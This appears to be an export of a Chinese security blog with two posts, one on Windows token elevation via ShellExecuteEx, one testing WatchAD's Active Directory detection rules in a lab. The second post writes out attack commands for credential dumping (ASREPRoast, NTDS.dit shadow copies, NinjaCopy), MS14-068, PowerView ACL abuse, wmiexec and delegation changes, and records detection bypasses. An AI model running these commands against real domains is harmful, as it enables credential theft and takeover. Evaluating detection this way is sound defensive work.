//首先构造一个SHELLEXECUTEINFO结构\n    SHELLEXECUTEINFO ShExecInfo = { 0 };\n    ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);\n    ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;\n    ShExecInfo.hwnd = NULL;\n    ShExecInfo.lpVerb = TEXT(\"runas\");//加了runas会使用管理员权限\n    ShExecInfo.lpFile = TEXT(\"C:\\\\Windows\\\\System32\\\\cmd.exe\");//要执行的文件\n    ShExecInfo.lpParameters = TEXT(\"\");\n    ShExecInfo.lpDirectory = NULL;\n    ShExecInfo.nShow = SW_SHOW;\n    ShExecInfo.hInstApp = NULL;\n    \n    //执行ShellExecuteEx\n    ShellExecuteEx(&ShExecInfo);\n\n    WaitForSingleObject(ShExecInfo.hProcess, INFINITE);\n}\n```\n\n### 代码解释\n\n这段代码的作用就是使用API ShellExecuteEx执行cmd.exe重点在于当结构SHELLEXECUTEINFO中的**lpVerb**被设置runas的时候，**lpFile**所指向的文件就会以提升之后的权限运行。\n\n这里看下使用runas和不适用runas的对比：\n\n![image-20200731210103241](windows_via_4.5_令牌和权限提升.assets/image-20200731210103241.png)\n\n![image-20200731210023694](windows_via_4.5_令牌和权限提升.assets/image-20200731210023694.png)\n\n可以添加了runas之后会使用管理员权限运行\n\n### CreateProcess与ShellExecuteEx的区别\n\nCreateProcess的权限完全由父进程继承，CreateProcess也可以选择不继承，不在这里说明了，做一个对比（关闭UAC的情况下）：\n\n![image-20200813202810666](windows_via_4.5_令牌和权限提升.assets/image-20200813202810666.png)\n\n![image-20200813202837583](windows_via_4.5_令牌和权限提升.assets/image-20200813202837583.png)\n\n而在使用ShellExecuteEx时可以有标准的提升到管理员的权限\n\n![image-20200813203033424](windows_via_4.5_令牌和权限提升.assets/image-20200813203033424.png)\n\n## 如何判断当前进程的权限\n\n看示例源码之前先了解几个API\n\n```\nOpenProcessToken()\n获取当前进程的Token句柄\n\nGetTokenInformation()\n根据Token句柄获取Token中的指定的信息\n\nCreateWellKnownSid()\n创建SID\n\nCheckTokenMembership()\n检查一个Token中是否存在某个SID值\n\nIsUserAnAdmin()\n判断当前用户是否为管理员权限\n```\n\n书中提供了源码：\n\n```c\n#include <iostream>\n#include <windows.h>\n#include <Shlobj.h>\n#include <winnt.h>\n\nBOOL GetProcessElevation(TOKEN_ELEVATION_TYPE* pELevationType,BOOL* pIsAdmin)\n{\n    HANDLE hToken = NULL;\n    DWORD dwSize;\n\n    //1 将当前进程的令牌句柄赋值给hToken\n    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))\n        return FALSE;\n\n\n    BOOL bResult = FALSE;\n    printf(\"pELevationType : %x\\n\", *pELevationType);\n    //2 GetTokenInformation被执行后会将pELevationType修改为当前进程使用的令牌\n    if (GetTokenInformation(\n        hToken, \n        TokenElevationType, \n        pELevationType, //上一个参数指定的TOKEN_ELEVATION_TYPE类型的值存入当前变量\n        sizeof(TOKEN_ELEVATION_TYPE), \n        &dwSize) )\n    {\n        printf(\"TokenElevationType : %d\\n\", TokenElevationType);\n        printf(\"pELevationType : %x\\n\", *pELevationType);\n        printf(\"dwSize : %x\\n\", dwSize);\n        BYTE adminSID[SECURITY_MAX_SID_SIZE];\n        dwSize = sizeof(adminSID);\n\n\n        //3 创建一个用于预定义别名的SID\n        CreateWellKnownSid(\n            WinBuiltinAdministratorsSid, //WELL_KNOWN_SID_TYPE枚举的成员，WinBuiltinAdministratorsSid的意思是与管理员组匹配的SID\n            NULL, \n            &adminSID, \n            &dwSize\n        );\n\n        //4 判断是否为筛选过的token，如果是，则执行，如果不是，则直接判断（这一步只判断令牌类型，不判断是否为管理员）\n        if (*pELevationType == TokenElevationTypeLimited) {\n            HANDLE hUnfilteredToken = NULL;\n\n            GetTokenInformation(\n                hToken, \n                TokenLinkedToken, \n                (VOID*)&hUnfilteredToken, \n                sizeof(HANDLE), \n                &dwSize);\n\n            //5 确定token中是否存在某一个SID?\n            if (CheckTokenMembership(\n                hUnfilteredToken, \n                &adminSID, \n                pIsAdmin\n            )) {\n                bResult = TRUE;\n            }\n            CloseHandle(hUnfilteredToken);\n        }\n        else {\n            *pIsAdmin = IsUserAnAdmin();//直接测试当前用户是否为管理员组的成员\n            bResult = TRUE;\n        }\n    }\n    CloseHandle(hToken);\n    return(bResult);\n}\n\nint main()\n{   //\n    TOKEN_ELEVATION_TYPE tokenStruct = TokenElevationTypeDefault;\n    BOOL admin = FALSE;\n    if (GetProcessElevation(&tokenStruct, &admin))\n    {\n        printf(\"true\\n\");\n    }\n    else\n    {\n        printf(\"false\\n\");\n    }\n\t\n    //是否可以直接使用IsUserAdmin?\n    BOOL IsAdmin = IsUserAnAdmin();\n    if (IsAdmin)\n    {\n        printf(\"true\\n\");\n    }\n    else\n    {\n        printf(\"false\\n\");\n    }\n}\n```\n\n函数流程：\n\n![Token](windows_via_4.5_令牌和权限提升.assets/Token.png)\n\n看懂了这个图再看一下下面的执行结果：这里在main函数中直接使用了IsUserAnAdmin方法测试，结果是上面的返回的是True，IsUserAnAdmin返回的是FALSE，也就是说IsUserAnAdmin只判断了当前执行的令牌权限，而上面源码中的GetProcessElevation函数是判断了用户的权限。\n\n![image-20200813145555072](windows_via_4.5_令牌和权限提升.assets/image-20200813145555072.png)\n\n","categories":["计算机基础"]},{"title":"WatchAD分析与测试","url":"/2020/12-18-WatchAD分析与测试/","content":"\n# 前言\n\n因为是在测试环境下测的，整个环境都是在单台电脑上，有时候可能出现日志不全之类的情况，所以不是每一条都是准确的，可以作为参考，但是不能作为最终结论。\n\n# 安装WatchAD\n\n![Architecture](WatchAD.assets/Architecture.png)\n\n## 服务端\n\n```\ngit clone https://github.com/0Kee-Team/WatchAD.git\ncd WatchAD\npip3 install -r requirements.txt\t\t//安装依赖包\nvim docker-compose.yaml\t修改taml文件中的es版本，原包中的5.2.2版本会报错，使用5.3.2版本\n```\n\n![image-20200327151923624](WatchAD.assets/image-20200327151923624.png)\n\n```\n创建非root账号，否则运行es会提示使用非root账户\nuseradd -r watchaduser\nusermod -s /bin/bash watchaduser\nuseradd -d /home/watchaduser -m watchaduser\npasswd watchaduser\t\t\t//密码是admin123\n\n安装watchAD服务\npython3 WatchAD.py --install -d test.local -s 192.168.10.128 -u test\\\\administrator -p admin123!\n\n起docker的各种服务\nservice docker start\nsu - watchaduser\nsudo docker-compose up\n\n运行WatchAD服务\npython3 WatchAD.py --start\n```\n\n## 安装 winlogbeat\n\n下载解压：\n\n修改文件winlogbeat.yml\n\n```\n#----------------------------- Logstash output --------------------------------\noutput.logstash:\n  # The Logstash hosts\n  hosts: [\"192.168.244.129:5044\"]\n```\n\n运行：\n\n```\ncd 'C:\\Program Files\\Winlogbeat'\n.\\install-service-winlogbeat.ps1\nStart-Service winlogbeat\n```\n\n## web端\n\n```\ngit clone https://github.com/0Kee-Team/WatchAD-Web.git\n\n把{WatchAD-Web}/server/config/database_config.py 此文件中的127.0.0.1全改为WatchAD所在的服务器IP。\n\ndocker-compose build\ndocker-compose up\n```\n\n然后访问\n\n```\nhttp://127.0.0.1/activity_timeline.html#/\n```\n\n即可进入界面\n\n## 启动\n\n```\ndocker：\ncd /opt/WatchAD/\nservice docker start\nsu - watchaduser\nsudo docker-compose up\n\n服务端：\ncd /opt/WatchAD/\npython3 WatchAD.py --start\n#watchAD虚拟机地址要是变了需要修改{WatchAD}/settings/winlogbeat/winlogbeat.yml中域控的地址\n\nWEB：\ncd /opt/WatchAD-Web/\ndocker-compose up\n\nkibana\ncd /opt/kibana-5.3.2-linux-x86_64/\n./bin/kibana\n\n\nWEB界面：\nhttp://127.0.0.1/activity_timeline.html#/\n```\n\n# 规则提取与分析\n\n所有的规则全部在detect目录下，下面分别做总结：\n\n![image-20200327172716907](WatchAD.assets/image-20200327172716907.png)\n\nWatchAD的日志结构：\n\n```\n\n        \"_index\": \"dc_log_2020.04.23\",\n        \"_type\": \"security_log\",\n        \"_id\": \"AXGk2y109aA2nixs3l0L\",\n        \"_score\": 1,\n        \"_source\": {\n          \"computer_name\": \"dc2012.test.local\",\n          \"opcode\": \"信息\",\n          \"task\": \"其他策略更改事件\",\n          \"message\": \"\"\"\n已更改 Windows 筛选平台筛选器。\n\t\n使用者:\n\t安全 ID:\t\tS-1-5-19\n\t帐户名称:\t\tNT AUTHORITY\\LOCAL SERVICE\n\n进程信息:\n\t进程 ID:\t740\n\n提供程序信息:\n\tID:\t\t{DECC16CA-3F33-4346-BE1E-8FB4AE0F3D62}\n\t名称:\t\tMicrosoft Corporation\n\n更改信息:\n\t更改类型:\t添加\n\n筛选器信息:\n\tID:\t\t{C8BB3B0F-13F6-4131-ABA1-E5FB9FA8DA05}\n\t名称:\t\tWindows 远程管理(HTTP-In)\n\t类型:\t\t非永久\n\t运行时 ID:\t65855\n\n层信息:\n\tID:\t\t{7AC9DE24-17DD-4814-B4BD-A9FBC95A321B}\n\t名称:\t\tALE 侦听 v6 层\n\t运行时 ID:\t42\n\n标注信息:\n\tID:\t\t{00000000-0000-0000-0000-000000000000}\n\t名称:\t\t-\n\n其他信息:\n\t权重:\t10376293541528731584\t\n\t条件:\t\n\t条件 ID:\t{d78e1e87-8644-4ea5-9437-d809ecefc971}\n\t匹配值:\t\t等于\n\t条件值:\t\t\n    00000000  53 00 79 00 73 00 74 00-65 00 6d 00 00 00        S.y.s.t.e.m...\n\n\n\t条件 ID:\t{0c1ba1af-5765-453f-af22-a8f791ac775b}\n\t匹配值:\t\t等于\n\t条件值:\t\t0x1761\n\n\t筛选器操作:\t允许\n\"\"\",\n          \"thread_id\": 608,\n          \"record_number\": \"1209238\",\n          \"log_name\": \"Security\",\n          \"level\": \"信息\",\n          \"process_id\": 544,\n          \"beat\": {\n            \"version\": \"6.2.2\",\n            \"name\": \"dc2012\",\n            \"hostname\": \"dc2012\"\n          },\n          \"tags\": [\n            \"beats_input_codec_plain_applied\"\n          ],\n          \"keywords\": [\n            \"审核成功\"\n          ],\n          \"host\": \"dc2012\",\n          \"event_data\": {\n            \"LayerName\": \"ALE 侦听 v6 层\",\n            \"ProcessId\": \"740\",\n            \"UserSid\": \"S-1-5-19\",\n            \"FilterName\": \"Windows 远程管理(HTTP-In)\",\n            \"CalloutKey\": \"{00000000-0000-0000-0000-000000000000}\",\n            \"Action\": \"%%16390\",\n            \"UserName\": \"NT AUTHORITY\\\\LOCAL SERVICE\",\n            \"Weight\": \"10376293541528731584\",\n            \"ProviderKey\": \"{DECC16CA-3F33-4346-BE1E-8FB4AE0F3D62}\",\n            \"FilterKey\": \"{C8BB3B0F-13F6-4131-ABA1-E5FB9FA8DA05}\",\n            \"FilterType\": \"%%16388\",\n            \"CalloutName\": \"-\",\n            \"ProviderName\": \"Microsoft Corporation\",\n            \"Conditions\": \"\"\"\n\n\t条件 ID:\t{d78e1e87-8644-4ea5-9437-d809ecefc971}\n\t匹配值:\t\t等于\n\t条件值:\t\t\n    00000000  53 00 79 00 73 00 74 00-65 00 6d 00 00 00        S.y.s.t.e.m...\n\n\n\t条件 ID:\t{0c1ba1af-5765-453f-af22-a8f791ac775b}\n\t匹配值:\t\t等于\n\t条件值:\t\t0x1761\n\"\"\",\n            \"LayerId\": \"42\",\n            \"FilterId\": \"65855\",\n            \"ChangeType\": \"%%16384\",\n            \"LayerKey\": \"{7AC9DE24-17DD-4814-B4BD-A9FBC95A321B}\"\n          },\n          \"source_name\": \"Microsoft-Windows-Security-Auditing\",\n          \"provider_guid\": \"{54849625-5478-4994-A5BA-3E3B0328C30D}\",\n          \"type\": \"wineventlog\",\n          \"@version\": \"1\",\n          \"@timestamp\": \"2020-04-23T02:17:58.751Z\",\n          \"event_id\": 5447\n        }\n      },\n```\n\n查询语句：\n\n```\nGET /dc_log_2020.04.23/_search\n```\n\n## Credential dumping\n\n### ASRepRoasting\n\n```\n4768事件\n特征：\n    ServiceName krbtgt\n    TicketEncryptionType 0x17\t\t//rc4算法\n    PreAuthType 0\t\t//预身份认证关闭\n```\n\n命令：\n\n```\n. .\\ASREPRoast.ps1\nGet-ASREPHash -Domain test.local -Username xiaom\n```\n\n测试发现成功告警：\n\n![image-20200410181403415](WatchAD.assets/image-20200410181403415.png)\n\n![image-20200410182334015](WatchAD.assets/image-20200410182334015.png)\n\nXML：\n\n```xml\n- <Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n- <System>\n  <Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\" /> \n  <EventID>4768</EventID> \n  <Version>0</Version> \n  <Level>0</Level> \n  <Task>14339</Task> \n  <Opcode>0</Opcode> \n  <Keywords>0x8020000000000000</Keywords> \n  <TimeCreated SystemTime=\"2020-04-10T10:21:30.718875000Z\" /> \n  <EventRecordID>667255</EventRecordID> \n  <Correlation /> \n  <Execution ProcessID=\"544\" ThreadID=\"1064\" /> \n  <Channel>Security</Channel> \n  <Computer>dc2012.test.local</Computer> \n  <Security /> \n  </System>\n- <EventData>\n  <Data Name=\"TargetUserName\">xiaom</Data> \n  <Data Name=\"TargetDomainName\">test.local</Data> \n  <Data Name=\"TargetSid\">S-1-5-21-2212815815-1602272524-4203810894-1106</Data> \n  <Data Name=\"ServiceName\">krbtgt</Data> \n  <Data Name=\"ServiceSid\">S-1-5-21-2212815815-1602272524-4203810894-502</Data> \n  <Data Name=\"TicketOptions\">0x40800010</Data> \n  <Data Name=\"Status\">0x0</Data> \n  <Data Name=\"TicketEncryptionType\">0x17</Data> \n  <Data Name=\"PreAuthType\">0</Data> \n  <Data Name=\"IpAddress\">::ffff:192.168.244.131</Data> \n  <Data Name=\"IpPort\">49221</Data> \n  <Data Name=\"CertIssuerName\" /> \n  <Data Name=\"CertSerialNumber\" /> \n  <Data Name=\"CertThumbprint\" /> \n  </EventData>\n  </Event>\n```\n\n### 绕过DumpPassword\n\n#### 远程WMIC VSSCopy\n\n```\nwmic /node:dc2012 /user:test\\administrator /password:admin123! process call create \"cmd /c vssadmin create shadow /for=C: 2>&1\"\n\nwmic /node:dc2012 /user:test\\administrator /password:admin123! process call create \"cmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\ntds.dit 2>&1\"\n```\n\n```\n最终事件ID：8222事件\n事件流：\n\t4688 -> 4688 -> 4904 -> 8222\n向前查找：\n4904日志：\n\tget_term_statement(\"event_data.ProcessName.keyword\",r\"C:\\Windows\\System32\\VSSVC.exe\"),\n\tget_term_statement(\"event_data.AuditSourceName.keyword\", \"VSSAudit\")\n4688日志：\n\tget_term_statement(\"event_data.NewProcessName.keyword\",r\"C:\\Windows\\System32\\VSSVC.exe\")\n\tor\n\tget_term_statement(\"event_data.NewProcessName.keyword\",r\"C:\\Windows\\System32\\vssadmin.exe\")\n```\n\n4688日志为进程创建，上面命令执行后会触发\n\n![image-20200410190414876](WatchAD.assets/image-20200410190414876.png)\n\n4904日志\n\n![image-20200420173806781](WatchAD.assets/image-20200420173806781.png)\n\n进程名称为VSSVC.exe\n\n8222日志没有产生，网上有个链接说的8222产生于创建卷影副本的时候：\n\nhttps://jpcertcc.github.io/ToolAnalysisResultSheet/details/vssadmin.htm\n\n#### 远程Invoke-mimikatz\n\n```\n最终事件ID：4674事件\n事件流：\n\t4656 -> 4674 -> 4688 -> 4674\n\n<Data Name=\"ProcessName\">c:\\windows\\system32\\wbem\\wmiprvse.exe</Data> \n<Data Name=\"ObjectName\">\\registry\\machine\\software\\microsoft\\windows nt\\currentversion\\perflib</Data>\n向前查找：\n4688日志：//进程创建\nget_term_statement(\"event_data.NewProcessName.keyword\",r\"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\")\n\n4674日志：//敏感权限使用\nget_term_statement(\"event_data.SubjectUserName.keyword\", user_name),\nget_term_statement(\"event_data.ProcessName.keyword\",r\"C:\\Windows\\System32\\wsmprovhost.exe\"),\nget_match_must_all(\"event_data.ObjectName\",r\"\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\services\\WinSock2\\Parameters\"),)\n\n4656日志：\nget_term_statement(\"event_data.ProcessName.keyword\",r\"C:\\Windows\\System32\\wsmprovhost.exe\")get_match_must_all(\"event_data.ObjectName\",r\"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN\"),)\n```\n\n使用mimikatz.exe进行Dcsync没发现告警：查看日志没看到4674日志\n\n#### 远程Invoke-NinjaCopy\n\n命令：\n\n```\n. .\\Invoke-NinjaCopy.ps1\nInvoke-NinjaCopy -Path \"c:\\windows\\ntds\\ntds.dit\" -ComputerName \"dc2012\" -LocalDestination \"c:\\ntds.dit\"\n```\n\n```\n4658事件\n\n向前查找：\n4656日志：\nget_term_statement(\"event_data.SubjectUserName.keyword\", user_name),\nget_match_must_all(\"event_data.ObjectName\",r\"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN\"),\nget_term_statement(\"event_data.ProcessName.keyword\",r\"C:\\Windows\\System32\\wsmprovhost.exe\")\n\n4688日志：//进程创建\nget_term_statement(\"event_data.NewProcessName.keyword\",r\"C:\\Windows\\System32\\wsmprovhost.exe\")\n```\n\n4658事件：https://www.manageengine.com/products/active-directory-audit/kb/object-access-events/event-id-4658.html\n\n![image-20200422133804545](WatchAD.assets/image-20200422133804545.png)\n\n![image-20200422133909955](WatchAD.assets/image-20200422133909955.png)\n\n4656和4658日志会产生，4688日志也产生了，但是没有告警\n\n## Defense evasion\n\n### 绕过ClearLog\n\n```\n清除日志会产生1102事件\n```\n\n规则会提取SubjectUserSid、SubjectUserName、SubjectDomainName等内容做展示。\n\n从kibana上查看发现可以看到对应日志：\n\n![image-20200423143417818](WatchAD.assets/image-20200423143417818.png)\n\n会产生1102事件，但是不会产生告警。\n\n凯东分析原因为：\n\n![image-20200423145149830](WatchAD.assets/image-20200423145149830.png)\n\n在整个data中搜索索event_data，但是整一条不存在event_data字段（上面的日志可见。）\n\n### 绕过CloseLogService\n\n```\n事件日志1100\n```\n\nhttps://docs.microsoft.com/zh-cn/windows/security/threat-protection/auditing/event-1100\n\n关闭服务的话直接在服务中搜索Windows Event Log服务，然后禁用即可：\n\n![image-20200422140142937](WatchAD.assets/image-20200422140142937.png)\n\n![image-20200422140219149](WatchAD.assets/image-20200422140219149.png)\n\n可以看到这里有Eventlog日志产生\n\n## Discovery\n\n### 有日志没告警EnumerateGroup\n\n```\n枚举某个内置域管理员成员组\n如 net group \"Domain Admins\" /domain\n\n事件ID 4661\nhttps://docs.microsoft.com/zh-cn/windows/security/threat-protection/auditing/event-4661\n```\n\n检测策略：\n\n```\n1、如果账号是管理员发起的，直接忽略\n2、判断账号是否为Users\n```\n\n执行net group \"Domain Admins\" /domain未告警，产生了4661日志，并且是Users用户执行的\n\n#### 改进\n\n```\n应该加上4658，4624日志一起做判断\n```\n\n![image-20200422153357443](WatchAD.assets/image-20200422153357443.png)\n\n### HoneypotUser\n\n蜜罐账号活动\n\n```\nEVENT_ID = [4768, 4769, 4770, 4771, 4776, 4624, 4625, 4648]\n```\n\n新增思路，在蜜罐上布置蜜饵\n\n思路二，钓鱼邮件，先发蜜饵，再发能够拿到shell的钓鱼文件\n\n### 有日志未告警PsLoggedOn\n\n```\nEVENT_ID = [5145]\n```\n\n策略：\n\n```\n判断\"ShareName\"需要等于r\"\\\\*\\IPC$\"否则直接return\n\"RelativeTargetName\"等于\"srvsvc\"，否则return\n忽略域管理员访问\n```\n\n命令：\n\n```\n.\\PsLoggedon64.exe \\\\dc2012\n```\n\n![image-20200422153841720](WatchAD.assets/image-20200422153841720.png)\n\n产生了多条对应日志，但是没有告警，RelativeTargetName的值为下面三条：\n\n![image-20200422154959882](WatchAD.assets/image-20200422154959882.png)\n\n![image-20200422155026142](WatchAD.assets/image-20200422155026142.png)\n\n![image-20200422155058100](WatchAD.assets/image-20200422155058100.png)\n\n### SearchUserDetail\n\n```\nEVENT_ID = [4661]\n\n会有一个函数调用链：\n\t查找详细的文件共享， winreg -> lsarpc -> srvsvc\n\n忽略查询自身的用户\n忽略管理员\n忽略Users之外的\n忽略敏感用户\n```\n\n## Escalation\n\n### 有日志未告警ACLModify\n\n```\nEVENT_ID = [5136]\n会产生5136日志\n```\n\n策略：\n\n```\n1、判断SID是否为S-1-5-21-开头\n2、获取用户信息\n3、判断目标是否为管理员权限\n```\n\n测试不告警存在5136日志，未找到原因\n\n### MS17-010\n\n```\nEVENT_ID = [5140]\n使用工具 https://github.com/apkjet/TrustlookWannaCryToolkit 扫描时，会触发该规则\n使用原版exp 只触发 5140，且 SubjectLogonId 为一个不存在的值（0x后接5位随机数），即没有任何登录事件与之关联\n该检测逻辑不能保证完全准确，单从该日志获取的有限信息只能粗略检测攻击，存在误报的可能性（目前内部观察未出现误报）。\n```\n\n### NewGPO\n\n```\nEVENT_ID = [5137]\n这里可能存在误报，5137和5136分别是修改和创建目录服务对象，所以不一定是ACL和\n5136(S): A directory service object was modified.\n5137(S): A directory service object was created.\n```\n\n这里实际同时触发了5136和5137两个日志\n\n![image-20200330160040358](WatchAD.assets/image-20200330160040358.png)\n\n在域控上直接创建产生了告警\n\n![image-20200422170113926](WatchAD.assets/image-20200422170113926.png)\n\n### NTLMRelay\n\n```\nEVENT_ID = [4624]\n\n    检测 NTLM 中继认证到域控的行为\n\n    已知特点如下：\n    1. 使用NTLM协议进行验证\n    2. 来源主机名为被中继NTLM请求的最初请求\n    3. 来源IP为中继攻击者IP\n    4. NTLM v1 更容易受到攻击，NTLM v2可开启签名防止篡改和中继\n\n    根据历史记录情况 判断IP和主机名的对应关系是否一致\n\n    因为IP经常变动，不建议对所有的请求进行比对，暂时只对固定的敏感机器进行检测\n```\n\n策略：\n\n```\n1、没有IP地址，直接return\n2、判断来源主机是否为敏感主机，如果不是直接return\n3、如果是主机名，则根据主机名查询IP地址\n4、二次确认，如果上次认证IP与当前IP不相同，则对主机名进行解析，判断IP是否相等\nresolver_ips = self._get_host_ip(log)\n判断两次请求的IP地址是否相同。\n```\n\n### ResBasedConsDelegation\n\n```\nEVENT_ID = [5136]\n已修改目录服务对象,和ACL使用的同一个日志\n\n一般RBCD利用会对下面的LDAP的值做修改\nAttributeLDAPDisplayName: msDS-AllowedToActOnBehalfOfOtherIdentity\n```\n\n```\nOpCorrelationID {5E009BAB-3CF8-4BC3-8F5A-A92657546634} \n  AppCorrelationID - \n  SubjectUserSid S-1-5-21-2212815815-1602272524-4203810894-1106 \n  SubjectUserName xiaom \n  SubjectDomainName TEST \n  SubjectLogonId 0x1b8484 \n  DSName test.local \n  DSType %%14676 \n  ObjectDN CN=DC2012,OU=Domain Controllers,DC=test,DC=local \n  ObjectGUID {8806E7FC-75A2-4396-A328-9787AFD784DB} \n  ObjectClass computer \n  AttributeLDAPDisplayName msDS-AllowedToActOnBehalfOfOtherIdentity \n  AttributeSyntaxOID 2.5.5.15 \n  AttributeValue O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2212815815-1602272524-4203810894-2106) \n  OperationType %%14674 \n```\n\n策略：\n\n```\n查询拥有特殊DACL权限的SID列表\n查询历史委派记录\n不存在记录 则新建 并直接告警\n存在记录且不变，退出\n存在记录 对比历史的sid 无新增 更新记录 退出\n存在记录 有新增 更新记录 告警\n```\n\n使用下面命令修改了两次，没有看到告警：\n\n```powershell\nSet-ADComputer dc2012 -PrincipalsAllowedToDelegateToAccount testrbcd$\n```\n\n总结为如果创建新的computer对象，则会产生5136日志，直接更改现有的computer对象不会产生，会有4742和4624两个日志产出\n\n![image-20200422171410928](WatchAD.assets/image-20200422171410928.png)\n\n确认之后发现如果有更改则是5136(目录服务查询)，不更改则是4662(目录服务更改)\n\n### SpoolSample\n\n```\nEVENT_ID = [5145]\n已检查网络共享对象以查看是否可以向客户授予所需的访问权限???\n\n```\n\n### 绕过UnkownAdminLogin\n\n```\n\"\"\"\n    4672 特殊登录\n\n    提权检测\n\n    分析当前特殊登录的账号是否在管理员账号列表中，如果不在则告警\n\n    目前已知的提权漏洞为 MS14-068\n\"\"\"\n```\n\n```\n.\\MS14-068.exe -u xiaom@test.local -s S-1-5-21-2212815815-1602272524-4203810894-1106 -d dc2012.test.local -p admin1234!\n```\n\n产生了对应日志：\n\n![image-20200426163618582](WatchAD.assets/image-20200426163618582.png)\n\n清除日志之后测试产生的所有日志：\n\n![image-20200426164845701](WatchAD.assets/image-20200426164845701.png)\n\n可能是这个原因导致没被return，原代码其中一个判断条件\n\n```python\n # 排除域控计算机账户的本地特权登录\n        if user_name.endswith(\"$\"):\n            domain = get_netbios_domain(domain_name)\n            if user_name[:-1] in main_config.dc_name_list[domain]:\n                return\n```\n\n建议直接从流量中检测，应该不会有误报\n\n## LateralMovement\n\n### BruteForce\n\n```\n4625\n帐户登录失败\n4771\nKerberos 预身份验证失败\n```\n\n策略\n\n```\nevent ID为4625时：\n判断数据中的AuthenticationPackageName是否为MICROSOFT_AUTHENTICATION_PACKAGE_V1_0，不是则return\n\n忽略机器账户\n\n判断PreAuthType=0\n\n爆破数量大于100个\n\n```\n\n### 绕过ExplicitCredential\n\n```\nEVENT_ID = [4648]\t使用显式凭据尝试登录\n\n如果日志显示IP日志为localhost，则直接return\n```\n\n![image-20200422175637466](WatchAD.assets/image-20200422175637466.png)\n\n产生了4648日志，但是也是localhost\n\n### RemoteCommandExec\n\n```\nEVENT_ID = [5145, 5142]\n5145：\n已检查网络共享对象以查看是否可以向客户授予所需的访问权限。\n5142：\n添加了一个网络共享对象。\n```\n\n策略：\n\n```\n如果事件ID为5145，则进行下列检查\n\tpsexec\n\t\t5145\n\t\tShareName=\\ADMIN$\n\t\t\"RelativeTargetName\"] == \"PSEXESVC.exe\"\n\twmiexec\n\t\t5145\n\t\tShareName=\\ADMIN$\n\t\t在\"RelativeTargetName\"中正则寻找re.search(r\"^__\\d{10}\\.\\d\", relative_target_name)，匹配中了return wmi_exec\n\twmiexec_vbs\n\t\t5142\n\t\t\"ShareName\"] == r\"\\\\*\\WMI_SHARE\"\n\t\t\"ShareLocalPath\"].lower() == r\"c:\\windows\\temp\"\n\tsmbexec\n\t\t5145\n\t\t\"ShareName\" == r\"\\\\*\\C$\"\n\t\t\"RelativeTargetName\" == \"__output\"\n```\n\n#### Psexec\n\n使用psexec的时候发现能告警\n\n#### 绕过WMI\n\n```\n5145\n检测 admin 共享开启, 同时 RelativeTargetName 为时间戳形式\n```\n\n\n\n```\nwmic /node:192.168.244.130 /user:test\\administrator /password:admin123!  process call create \"cmd.exe\"\n```\n\n直接执行不告警，查日志没找到5145日志\n\nwmicexec.vbs\n\n```\ncscript.exe //nologo wmiexec.vbs /shell 192.168.244.130 test\\administrator admin123!\n```\n\n这一步是发现了5145日志的，但是没有看到5142日志\n\n同时有脚本判断ShareLocalPath的路径是否为c:\\windows\\temp，实验发现C:\\也是可以的\n\n```\nif log.event_data[\"ShareLocalPath\"].lower() == r\"c:\\windows\\temp\":\n\treturn \"wmi_exec\"\n```\n\n![image-20200423154545631](WatchAD.assets/image-20200423154545631.png)\n\n![image-20200424101623687](WatchAD.assets/image-20200424101623687.png)\n\n这里的路径应该是可以随意设置\n\n### UnkonwFileShare\n\n```\nEVENT_ID = [5145]\n```\n\n```\nrelative_target_name不等于[\"protected_storage\", \"lsarpc\", \"samr\", \"ntsvcs\", \"NETLOGON\"]\n检查历史日志，对该名称的共享使用次数，超过10次判断为正常共享\n```\n\n这个发现只要访问域控的就会触发告警\n\n## Persistence\n\n### AdminSDHolder\n\n```\n5136\n\nAdminSDHolder 更改，一般用作权限维持，因为更改情况极少，所以直接告警\n```\n\n![image-20200424102756854](WatchAD.assets/image-20200424102756854.png)\n\n直接在域控上ADSI修改产生告警，使用powerview对AdminSDHolder进行添加ACL\n\n```\n. .\\pv.ps1\nAdd-DomainObjectAcl -TargetIdentity \"CN=AdminSDHolder,CN=System,DC=test,DC=local\" -PrincipalIdentity xiaom -Rights All\n```\n\n测试结果发现特征被命中\n\n![image-20200424102901487](WatchAD.assets/image-20200424102901487.png)\n\n额外补充：在同步时，域控会产生多个4780日志：\n\n![image-20200426135247926](WatchAD.assets/image-20200426135247926.png)\n\n### DCShadow\n\n需要跟一下DCShadow的原理\n\n```\nEVENT_ID = [4742, 5137, 5141, 4928]\n\n分为三部分的特征：\n1. 计算机SPN修改  (spn modify)\n2. 域控创建和删除  (DC server create and delete)\n3. 同步监控 (Replication Monitoring)\n```\n\n```\nSPN修改：\nevent_id  4742\n非域控计算机修改SPN为异常值，如果目标服务器为已知的域控计算机名，则忽略\n\n同时判断spn的值是否以\"GC/\"或者\"E3514235-4B06-11D1-AB04-00C04FC2DCD2/\"开头\n```\n\n```\nevent_id 5137\n\n配置名称空间内创建服务，目标非域控计算机\n```\n\n```\nevent_id 5141\n\n配置名称空间内服务删除，目标非域控计算机\n```\n\n凯东记录的：\n\n```\n在NTDS设置、DC服务器创建、DC服务器删除的判断逻辑中，使用了默认域设置的Default-First-Site-Name作为判断列表中的其中一项，真实环境下Site名称都是根据企业自身环境进行命名的，在携程是CNSH、CNNT等，默认Site名称判断导致检测可被绕过\n\nfix：移除Default-First-Site-Name的判断，对dn添加其他路径名称检测\n```\n\n### DSRM\n\n```\nEVENT_ID = [4794]：尝试设置目录服务还原模式管理员密码（要求在2008 R2和更高版本中启用帐户管理/用户管理子类别审核）。\n```\n\n只对4794日志做了检测\n\n```\n1.监控与DSRM密码重置和使用相关的事件日志 \n    4794：试图设置目录服务还原模式管理员密码。 \n2.监控如下注册表位置的值，当值为 1 或 2时，应引起警示 \n    